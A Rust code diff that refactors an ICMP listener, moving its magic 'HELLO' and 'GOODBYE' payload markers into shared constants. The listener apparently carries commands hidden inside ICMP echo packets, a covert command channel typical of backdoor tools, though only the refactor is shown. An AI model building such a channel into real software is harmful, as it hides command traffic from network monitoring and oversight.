@@ -1,3 +1,4 @@
+use crate::vars::{CMD_INIT, CMD_RESP};
 use pnet::{
     datalink::{
         channel, interfaces, Channel::Ethernet, Config, DataLinkReceiver, DataLinkSender,
@@ -16,15 +17,11 @@ use pnet::{
 use std::{
     io::{Read, Write},
     net::{
-        IpAddr::{V4, V6},
         Ipv4Addr,
     },
     str::FromStr,
     time::SystemTime,
 };
-
-static cmd_init: &[u8; 22] = b"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0HELLO";
-static cmd_resp: &[u8; 7] = b"GOODBYE";
 
 pub struct IcmpListener {
     tx: Box<dyn DataLinkSender>,
@@ -104,7 +101,7 @@ impl Read for IcmpListener {
                     }
                 }
                 if packet.get_icmp_type().0 == 0 {
-                    if &payload[0..7] == cmd_resp {
+                    if &payload[0..7] == CMD_RESP {
                         let cmd = &payload[7..];
                         let len = cmd.len();
                         for i in 0..len {
@@ -125,7 +122,7 @@ impl Read for IcmpListener {
 impl Write for IcmpListener {
     fn write(&mut self, data: &[u8]) -> Result<usize, std::io::Error> {
         let mut out = Vec::from(data);
-        let mut balls = Vec::from(*cmd_init);
+        let mut balls = Vec::from(*CMD_INIT);
         balls.append(&mut out);
 
         let mut buffer = [0; 1000];
